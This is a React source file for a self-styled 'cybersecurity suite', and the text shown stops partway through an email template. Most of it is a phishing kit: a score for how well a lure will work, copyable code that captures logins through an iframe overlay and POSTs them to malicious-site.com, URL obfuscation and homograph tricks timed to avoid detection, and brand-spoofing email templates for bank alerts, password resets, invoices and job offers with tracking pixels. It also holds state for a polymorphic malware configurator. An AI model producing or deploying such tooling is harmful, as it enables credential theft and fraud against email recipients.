"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Slider } from "@/components/ui/slider"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Checkbox } from "@/components/ui/checkbox"
import { Textarea } from "@/components/ui/textarea"
import {
  AlertCircle,
  FileIcon,
  Shield,
  Bug,
  LinkIcon,
  Mail,
  Globe,
  Copy,
  Code,
  Download,
  CreditCard,
  Briefcase,
  RefreshCw,
  Facebook,
  Check,
  AlertTriangle,
  DollarSign,
  Calendar,
} from "lucide-react"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Separator } from "@/components/ui/separator"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Progress } from "@/components/ui/progress"
import { Badge } from "@/components/ui/badge"

import type { JSX } from "react/jsx-runtime"

export default function AdvancedCybersecuritySuite() {
  // LNK Manipulator State
  const [lnkFile, setLnkFile] = useState("")
  const [lnkOperation, setLnkOperation] = useState("")
  const [lnkValue, setLnkValue] = useState("")
  const [isHidden, setIsHidden] = useState(false)
  const [isReadOnly, setIsReadOnly] = useState(false)
  const [isSystem, setIsSystem] = useState(false)

  // Malware Configurator State
  const [polymorphismLevel, setPolymorphismLevel] = useState("medium")
  const [obfuscationMethods, setObfuscationMethods] = useState<string[]>([])
  const [variantCount, setVariantCount] = useState(1)
  const [variantInterval, setVariantInterval] = useState(60)
  const [selectedVulnerability, setSelectedVulnerability] = useState("")
  const [payload, setPayload] = useState("")

  // Phishing Kit State
  const [phishingTemplate, setPhishingTemplate] = useState("")
  const [targetOrganization, setTargetOrganization] = useState("Acme Corporation")
  const [phishingType, setPhishingType] = useState("corporate")
  const [sophisticationLevel, setSophisticationLevel] = useState(7)
  const [includeAttachment, setIncludeAttachment] = useState(true)
  const [includeLogo, setIncludeLogo] = useState(true)
  const [generatedEmail, setGeneratedEmail] = useState("")
  const [emailPreview, setEmailPreview] = useState<JSX.Element | null>(null)
  const [emailHtmlSource, setEmailHtmlSource] = useState("")
  const [targetAudience, setTargetAudience] = useState("employees")
  const [useUrgencyTactics, setUseUrgencyTactics] = useState(true)
  const [useSocialProofing, setUseSocialProofing] = useState(false)
  const [usePersonalization, setUsePersonalization] = useState(true)
  const [domainSpoofing, setDomainSpoofing] = useState(false)
  const [trackingPixel, setTrackingPixel] = useState(true)
  const [redirectMethod, setRedirectMethod] = useState("direct")
  const [landingPageType, setLandingPageType] = useState("login")
  const [copySuccess, setCopySuccess] = useState(false)
  const [showSourceCode, setShowSourceCode] = useState(false)
  const [redirectCodeCopied, setRedirectCodeCopied] = useState(false)
  const [phishingScore, setPhishingScore] = useState(0)
  const [phishingLevel, setPhishingLevel] = useState("")
  const [showRedirectCode, setShowRedirectCode] = useState(false)

  // Shared State
  const [result, setResult] = useState<{ success: boolean; message: string } | null>(null)

  // Calculate phishing effectiveness score when relevant parameters change
  useEffect(() => {
    calculatePhishingScore()
  }, [
    phishingTemplate,
    phishingType,
    sophisticationLevel,
    useUrgencyTactics,
    useSocialProofing,
    usePersonalization,
    domainSpoofing,
    trackingPixel,
    redirectMethod,
    landingPageType,
    includeAttachment,
    includeLogo,
  ])

  // Generate email preview when template changes
  useEffect(() => {
    if (phishingTemplate) {
      generateEmailPreview(phishingTemplate)
    }
  }, [
    phishingTemplate,
    targetOrganization,
    includeLogo,
    sophisticationLevel,
    useUrgencyTactics,
    useSocialProofing,
    usePersonalization,
    includeAttachment,
    trackingPixel,
    domainSpoofing,
    redirectMethod,
  ])

  const calculatePhishingScore = () => {
    let score = 0

    // Base score from sophistication level (1-10)
    score += sophisticationLevel * 5

    // Template type (some are more effective than others)
    switch (phishingTemplate) {
      case "password-reset":
      case "bank-alert":
      case "security-breach":
        score += 15
        break
      case "account-verification":
      case "invoice":
      case "tax-refund":
        score += 12
        break
      case "package-delivery":
      case "cloud-storage":
      case "subscription-renewal":
        score += 10
        break
      case "social-media":
      case "job-opportunity":
      case "covid-alert":
        score += 8
        break
      case "software-update":
        score += 7
        break
      default:
        score += 5
    }

    // Phishing type
    if (phishingType === "financial") score += 10
    if (phishingType === "corporate") score += 8
    if (phishingType === "personal") score += 6
    if (phishingType === "service") score += 7

    // Social engineering techniques
    if (useUrgencyTactics) score += 12
    if (useSocialProofing) score += 8
    if (usePersonalization) score += 10

    // Technical sophistication
    if (domainSpoofing) score += 15
    if (trackingPixel) score += 5

    // Redirect method
    switch (redirectMethod) {
      case "obfuscated":
        score += 15
        break
      case "iframe":
        score += 12
        break
      case "shortened":
        score += 10
        break
      case "direct":
        score += 5
        break
    }

    // Landing page type
    switch (landingPageType) {
      case "login":
        score += 15
        break
      case "form":
        score += 12
        break
      case "download":
        score += 10
        break
      case "redirect":
        score += 5
        break
    }

    // Visual elements
    if (includeAttachment) score += 8
    if (includeLogo) score += 7

    // Cap the score at 100
    score = Math.min(score, 100)

    // Set the score
    setPhishingScore(score)

    // Set the level based on score
    if (score >= 85) setPhishingLevel("Very High")
    else if (score >= 70) setPhishingLevel("High")
    else if (score >= 50) setPhishingLevel("Medium")
    else if (score >= 30) setPhishingLevel("Low")
    else setPhishingLevel("Very Low")
  }

  const getRedirectCode = (method: string): string => {
    switch (method) {
      case "direct":
        return `<!-- Direct Link Method -->
<a href="https://malicious-site.com/login.php">Click here to verify your account</a>

<!-- HTML Implementation -->
<form action="https://malicious-site.com/login.php" method="post">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>`

      case "iframe":
        return `<!-- iFrame Redirect Method -->
<!-- This loads the legitimate site in an iframe while the phishing form captures credentials -->
<div style="position: relative;">
  <!-- Visible phishing form -->
  <div style="position: absolute; top: 0; left: 0; z-index: 10; background: rgba(255,255,255,0.9); padding: 20px; border-radius: 5px;">
    <form id="phishing-form" action="https://malicious-site.com/capture.php" method="post">
      <h2>Please re-enter your credentials</h2>
      <input type="text" name="username" placeholder="Username">
      <input type="password" name="password" placeholder="Password">
      <button type="submit">Login</button>
    </form>
  </div>
  
  <!-- Legitimate site loaded in background iframe -->
  <iframe src="https://legitimate-site.com" style="width: 100%; height: 600px;"></iframe>
</div>

<!-- JavaScript Implementation -->
<script>
  document.getElementById('phishing-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const username = this.elements.username.value;
    const password = this.elements.password.value;
    
    // Send data to attacker's server
    fetch('https://malicious-site.com/capture.php', {
      method: 'POST',
      body: JSON.stringify({ username, password }),
      headers: { 'Content-Type': 'application/json' }
    })
    .then(() => {
      // Redirect to legitimate site after capturing credentials
      window.location.href = 'https://legitimate-site.com';
    });
  });
</script>`

      case "shortened":
        return `<!-- URL Shortening Method -->
<!-- Using a URL shortening service to mask the malicious URL -->

<!-- HTML Implementation -->
<a href="https://short.url/a1b2c3">Click here to verify your account</a>

<!-- Server-side Implementation (PHP) -->
<?php
// On the server that handles the shortened URL
// Redirect to the malicious site
header('Location: https://malicious-site.com/login.php');
exit;
?>

<!-- URL Shortening Service API Example (JavaScript) -->
<script>
  // Example of using a URL shortening API
  async function createShortUrl(longUrl) {
    const response = await fetch('https://api.shorturl.com/create', {
      method: 'POST',
      body: JSON.stringify({ url: longUrl }),
      headers: { 'Content-Type': 'application/json', 'API-Key': 'your_api_key' }
    });
    const data = await response.json();
    return data.shortUrl;
  }
  
  // Usage
  createShortUrl('https://malicious-site.com/login.php')
    .then(shortUrl => {
      console.log('Shortened URL:', shortUrl);
      // Use this URL in your phishing email
    });
</script>`

      case "obfuscated":
        return `<!-- URL Obfuscation Methods -->

<!-- Method 1: Using encoded characters in URL -->
<a href="https://legitimate-looking-site.com/%75%73%65%72/%6C%6F%67%69%6E">Secure Login</a>

<!-- Method 2: Using subdomains to make URL look legitimate -->
<a href="https://legitimate-site.com.malicious-domain.com">Secure Login</a>

<!-- Method 3: Using similar-looking characters (homograph attack) -->
<a href="https://lеgitimаtе-sitе.com">Secure Login</a>
<!-- Note: Some characters above are not standard Latin characters -->

<!-- Method 4: Using data URI scheme -->
<a href="data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHBzOi8vbWFsaWNpb3VzLXNpdGUuY29tL2xvZ2luLnBocCc7PC9zY3JpcHQ+">Secure Login</a>

<!-- Method 5: JavaScript obfuscation -->
<script>
  // Obfuscated JavaScript that redirects to malicious site
  var url = '';
  url += 'h';
  url += 't';
  url += 't';
  url += 'p';
  url += 's';
  url += ':';
  url += '/';
  url += '/';
  url += 'm';
  url += 'a';
  url += 'l';
  url += 'i';
  url += 'c';
  url += 'i';
  url += 'o';
  url += 'u';
  url += 's';
  url += '-';
  url += 's';
  url += 'i';
  url += 't';
  url += 'e';
  url += '.';
  url += 'c';
  url += 'o';
  url += 'm';
  
  function redirect() {
    window.location.href = url;
  }
  
  // Call with setTimeout to avoid immediate detection
  setTimeout(redirect, 1000);
</script>`

      default:
        return "// Select a redirect method to see the code"
    }
  }

  const handleCopyRedirectCode = () => {
    const code = getRedirectCode(redirectMethod)
    navigator.clipboard
      .writeText(code)
      .then(() => {
        setRedirectCodeCopied(true)
        setTimeout(() => setRedirectCodeCopied(false), 2000)
      })
      .catch((err) => {
        console.error("Failed to copy code: ", err)
      })
  }

  const generateEmailHtml = (template: string): string => {
    const baseUrl = domainSpoofing
      ? `https://${targetOrganization.toLowerCase().replace(/\s+/g, "")}-secure.com`
      : `https://${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com`

    const trackingPixelHtml = trackingPixel
      ? `<img src="${baseUrl}/track.png" width="1" height="1" style="display:none">`
      : ""

    const logoHtml = includeLogo
      ? `<img src="${baseUrl}/logo.png" alt="${targetOrganization} Logo" width="48" height="48" style="display:block;">`
      : ""

    let actionUrl = ""
    switch (redirectMethod) {
      case "direct":
        actionUrl = `${baseUrl}/action`
        break
      case "iframe":
        actionUrl = `${baseUrl}/iframe-redirect?dest=action`
        break
      case "shortened":
        actionUrl = "https://short.url/a1b2c3"
        break
      case "obfuscated":
        actionUrl = `${baseUrl}/${btoa("action").substring(0, 8)}`
        break
    }

    const urgencyText = useUrgencyTactics
      ? '<p style="color:#cc0000;font-weight:bold;">This requires your immediate attention. Please act within 24 hours.</p>'
      : ""

    const personalizationText = usePersonalization
      ? "<p>As a valued member of our community, we prioritize your security.</p>"
      : ""

    const socialProofText = useSocialProofing
      ? "<p>Join thousands of users who have already secured their accounts.</p>"
      : ""

    const attachmentHtml = includeAttachment
      ? '<div style="margin:15px 0;padding:10px;border:1px solid #ddd;background-color:#f9f9f9;">' +
        '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAHtSURBVDjLjZO/S1thGMc/748kRqypoWaoxHoJKC1BHMTBpZODS6Gg0MEOFv+AoUs7uRRcXZyUOhSKg1O1FCKS4JCGIC2VKj1JbK/3vJff+5w7lCTG0MPD+XF4+H6f7/fAOWNMHtgHbgGjQMJ7/QJ4C7w2xrxnStmILcSIEUeAV8DV/4x5JcaYHt8Z+SjwDngQQlKMUKSDtVZFE8mRcw5RNZ4Yv2ZzZP7ZRNnZ2BqZyDgwmUwSxzGxjsn4QhJHKHrYbkVRRKVSUaVSiVZWVhQEgTLGMJVL3R+9P58bDIWwW3+js6lCEASUy2VZXFys9sosy7JjrVw6WKgXE3hSJC8TGGPwAoH3bPjnUoVCoD9WqFQqtNtter0em9UPsafrd4G1neBLEAQ0m00uQgSQZRm2aHlZ/0QYBU9UjJ4WK5+s12p8T96wfq/O+tP1B7XpdJpLzIwxDADGx8d/l0qlpOgZHBzEaUe3a9n6VqPT6bBQWLj2vs5weER8fYQtvcLWHbHlOzghPJ0vLu+Yb3DC+Gri5tHxwT7ucIxIgigULbFy+Fqk/vCMk9MjNh+VKl8bm/fSp+8+nEXPGhPFDKmhQW4Mj3CpP8HE1Qk+7m6xszvf/LP0N1WzMCgYy+JRAAAAAElFTkSuQmCC" width="16" height="16" style="vertical-align:middle;margin-right:5px;">' +
        `<span style="font-size:14px;">Document.pdf</span>` +
        '<span style="color:#777;font-size:12px;margin-left:5px;">(238 KB)</span>' +
        "</div>"
      : ""

    let html = ""

    switch (template) {
      case "password-reset":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Password Reset Required</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .button { display: inline-block; background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Security Team</div>
        <div class="email-address">security@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 10:42 AM</div>
    </div>
    <div class="content">
      <div class="subject">Urgent Security Alert: Password Reset Required</div>
      <p>Dear User,</p>
      <p>Our security system has detected unusual login attempts on your account. To protect your information, please reset your password immediately.</p>
      ${urgencyText}
      <p><a href="${actionUrl}" class="button">Reset Password Now</a></p>
      <p>If you did not request this change, please contact our security department immediately at security@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com.</p>
      ${personalizationText}
      ${socialProofText}
      <p>Regards,<br>Security Team<br>${targetOrganization}</p>
    </div>
    <div class="footer">
      <p>This email contains confidential information and is intended only for the recipient.</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "account-verification":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account Verification Required</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .button { display: inline-block; background-color: #28a745; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Account Services</div>
        <div class="email-address">accounts@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 09:15 AM</div>
    </div>
    <div class="content">
      <div class="subject">Account Verification Required - Action Needed</div>
      <p>Dear Valued Customer,</p>
      <p>We are conducting a routine verification of all accounts to ensure the security of our platform.</p>
      ${urgencyText}
      <p><a href="${actionUrl}" class="button">Verify Account</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>This process will only take a few minutes of your time.</p>
      <p>Thank you,<br>Customer Support Team<br>${targetOrganization}</p>
    </div>
    <div class="footer">
      <p>© ${new Date().getFullYear()} ${targetOrganization}. All rights reserved.</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "invoice":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Invoice Payment Required</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .attachment { margin: 15px 0; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; display: flex; align-items: center; }
    .attachment-icon { margin-right: 10px; }
    .attachment-name { font-size: 14px; }
    .attachment-size { color: #777; font-size: 12px; margin-left: 5px; }
    .button { display: inline-block; background-color: #6f42c1; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Billing Department</div>
        <div class="email-address">billing@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 14:30 PM</div>
    </div>
    <div class="content">
      <div class="subject">Invoice #INV-29581 - Payment Required</div>
      <p>Dear Client,</p>
      <p>Please find attached the invoice #INV-29581 for recent services.</p>
      ${attachmentHtml}
      ${urgencyText}
      <p><a href="${actionUrl}" class="button">View and Pay Invoice</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>Thank you,<br>Billing Department<br>${targetOrganization}</p>
    </div>
    <div class="footer">
      <p>Please do not reply to this email. For inquiries, contact billing@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "package-delivery":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Package Delivery Notification</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .package-details { margin: 15px 0; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; }
    .package-details p { margin: 5px 0; }
    .button { display: inline-block; background-color: #f0ad4e; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Delivery Services</div>
        <div class="email-address">deliveries@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 11:20 AM</div>
    </div>
    <div class="content">
      <div class="subject">Package Delivery Notification - Action Required</div>
      <p>Hello,</p>
      <p>A package addressed to you is pending delivery. Unfortunately, we couldn't deliver it due to an incomplete address.</p>
      ${urgencyText}
      <div class="package-details">
        <p><strong>Package Details:</strong></p>
        <p>Tracking Number: PKG78392057</p>
        <p>Attempted Delivery: Today at 9:30 AM</p>
      </div>
      <p><a href="${actionUrl}" class="button">Confirm Delivery Details</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>Regards,<br>Delivery Service<br>On behalf of ${targetOrganization}</p>
    </div>
    <div class="footer">
      <p>This is an automated message. Please do not reply.</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "cloud-storage":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document Shared With You</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .attachment { margin: 15px 0; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; display: flex; align-items: center; }
    .attachment-icon { margin-right: 10px; }
    .attachment-name { font-size: 14px; }
    .attachment-size { color: #777; font-size: 12px; margin-left: 5px; }
    .button { display: inline-block; background-color: #0099cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Cloud Storage</div>
        <div class="email-address">share@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 15:47 PM</div>
    </div>
    <div class="content">
      <div class="subject">Important Document Shared With You</div>
      <p>Hello,</p>
      <p>A document has been shared with you via ${targetOrganization} Cloud Storage.</p>
      ${attachmentHtml}
      ${urgencyText}
      <p><a href="${actionUrl}" class="button">View Document</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>Best regards,<br>${targetOrganization} Cloud Team</p>
    </div>
    <div class="footer">
      <p>Secure file sharing powered by ${targetOrganization} Cloud Storage</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "bank-alert":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Important Security Alert</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .transaction-details { margin: 15px 0; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; }
    .transaction-details p { margin: 5px 0; }
    .button { display: inline-block; background-color: #007bff; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Banking</div>
        <div class="email-address">security@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 13:05 PM</div>
    </div>
    <div class="content">
      <div class="subject">Important Security Alert: Unusual Transaction Detected</div>
      <p>Dear Valued Customer,</p>
      <p>Our fraud detection system has identified an unusual transaction on your account that requires your immediate verification.</p>
      ${urgencyText}
      <div class="transaction-details">
        <p><strong>Transaction Details:</strong></p>
        <p>Date: ${new Date().toLocaleDateString()}</p>
        <p>Amount: $1,249.99</p>
        <p>Merchant: Foreign Online Retailer</p>
        <p>Location: Overseas</p>
      </div>
      <p>If you do not recognize this transaction, please verify your account immediately to prevent further unauthorized charges.</p>
      <p><a href="${actionUrl}" class="button">Verify Transaction</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>Sincerely,<br>Security Team<br>${targetOrganization} Banking</p>
    </div>
    <div class="footer">
      <p>This is an automated security alert. Please do not reply to this email.</p>
      <p>For assistance, contact our customer service at 1-800-555-0123.</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "social-media":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>New Message Notification</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; background-color: #4267B2; color: white; padding: 10px; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #eee; }
    .date { margin-left: auto; font-size: 12px; color: #eee; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .notification { margin: 15px 0; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; display: flex; align-items: center; }
    .profile-pic { width: 50px; height: 50px; border-radius: 50%; background-color: #ddd; margin-right: 10px; }
    .message-preview { font-style: italic; color: #666; }
    .button { display: inline-block; background-color: #4267B2; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Social</div>
        <div class="email-address">notifications@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 16:22 PM</div>
    </div>
    <div class="content">
      <div class="subject">You have a new message from John Smith</div>
      <p>Hello,</p>
      <p>You have received a new private message on your ${targetOrganization} Social account.</p>
      <div class="notification">
        <div class="profile-pic"></div>
        <div>
          <p><strong>John Smith</strong> sent you a message:</p>
          <p class="message-preview">"Hey, long time no see! Check out this link I found..."</p>
        </div>
      </div>
      ${urgencyText}
      <p><a href="${actionUrl}" class="button">View Message</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>Thanks,<br>${targetOrganization} Social Team</p>
    </div>
    <div class="footer">
      <p>This message was sent to you because you have notifications enabled.</p>
      <p>To unsubscribe from these emails, update your <a href="#">notification settings</a>.</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "job-opportunity":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Job Opportunity</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .job-details { margin: 15px 0; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; }
    .job-details h3 { margin-top: 0; }
    .job-details ul { padding-left: 20px; }
    .button { display: inline-block; background-color: #5cb85c; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Recruitment</div>
        <div class="email-address">careers@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 09:45 AM</div>
    </div>
    <div class="content">
      <div class="subject">Exclusive Job Opportunity: Senior Position Available</div>
      <p>Dear Professional,</p>
      <p>Based on your impressive profile and experience, we would like to invite you to apply for a senior position at ${targetOrganization}.</p>
      <div class="job-details">
        <h3>Senior Developer Position</h3>
        <p><strong>Salary Range:</strong> $120,000 - $150,000</p>
        <p><strong>Location:</strong> Remote / Hybrid</p>
        <p><strong>Requirements:</strong></p>
        <ul>
          <li>5+ years of experience</li>
          <li>Leadership skills</li>
          <li>Advanced technical knowledge</li>
        </ul>
      </div>
      ${urgencyText}
      <p><a href="${actionUrl}" class="button">View Job Details & Apply</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>Best regards,<br>Recruitment Team<br>${targetOrganization}</p>
    </div>
    <div class="footer">
      <p>This is a private job opportunity sent to selected candidates only.</p>
      <p>If you're not interested, you can <a href="#">unsubscribe</a> from our talent pool.</p>
